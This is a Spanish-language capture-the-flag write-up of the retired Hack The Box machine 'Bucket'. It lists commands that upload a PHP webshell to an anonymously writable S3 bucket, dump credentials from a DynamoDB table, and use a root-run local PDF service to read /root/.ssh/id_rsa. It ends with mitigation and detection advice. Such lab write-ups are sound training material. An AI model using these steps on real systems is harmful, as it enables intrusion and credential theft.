---
machine: Bucket
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, aws, s3, dynamodb, pdf, privesc]
---

# Bucket — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La aplicación usa un bucket S3 escribible para servir el sitio. Se sube un webshell PHP y se obtiene ejecución; DynamoDB filtra la contraseña de `management`. Desde esa cuenta, un servicio PDF en localhost permite leer archivos como root y convertir la lectura en una shell.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- Puertos: `22/tcp` SSH y `80/tcp` HTTP.
- Servicios: Servidor web y endpoints que simulan S3 y DynamoDB de AWS.
- Tecnologías: AWS CLI, S3, DynamoDB, PHP y un servicio PDF en localhost.

## Enumeración

- `bucket.htb` y el endpoint `s3.bucket.htb`.
- Bucket `adserver` con escritura anónima.
- Tabla DynamoDB `users` con credenciales.
- Servicio PDF escuchando solo en `127.0.0.1`.

## Foothold

Se enumera S3 con la CLI, se sube un PHP al bucket que sirve el vhost y se visita la ruta pública. La shell corre como el usuario del servidor web; DynamoDB entrega la contraseña de `management` para SSH.

```bash
aws --endpoint-url http://s3.bucket.htb s3 ls
aws --endpoint-url http://s3.bucket.htb s3 cp shell.php s3://adserver/shell.php
curl http://bucket.htb/shell.php
aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users
ssh management@bucket.htb
```

## Movimiento lateral

La contraseña de DynamoDB se reutiliza para SSH; el siguiente salto es al servicio PDF local, no a otro host.

## Escalada de privilegios

El generador de PDF acepta una ubicación controlada por el usuario y ejecuta como root. Se usa para leer archivos privilegiados y después para escribir una clave o ejecutar un comando.

```bash
ss -lntp
curl http://127.0.0.1:<PORT>/
# Leer un archivo como root y convertirlo en acceso:
curl "http://127.0.0.1:<PORT>/?url=file:///root/.ssh/id_rsa"
```

## Evidencia

- Listado y escritura en el bucket `adserver`.
- Webshell accesible desde el vhost.
- Contraseña de `management` y salida del servicio PDF.

## Lecciones aprendidas

- Los endpoints que imitan cloud conservan los mismos fallos de permisos.
- Un bucket escribible que sirve código es RCE directo.
- Los servicios internos suelen tener más privilegios que la aplicación expuesta.

## Mitigación y detección

- Bloquear escritura anónima y servir estáticos desde un bucket sin ejecución.
- Sacar credenciales de DynamoDB del código y rotarlas.
- Ejecutar el generador PDF sin privilegios y validar rutas y URLs.

## Referencias

- [0xdf — Bucket](https://0xdf.gitlab.io/2021/04/24/htb-bucket.html)
- [IppSec — Bucket](https://www.youtube.com/watch?v=SgWhuTxm2oY)
- [Hack The Box — Bucket](https://app.hackthebox.com/machines/bucket)
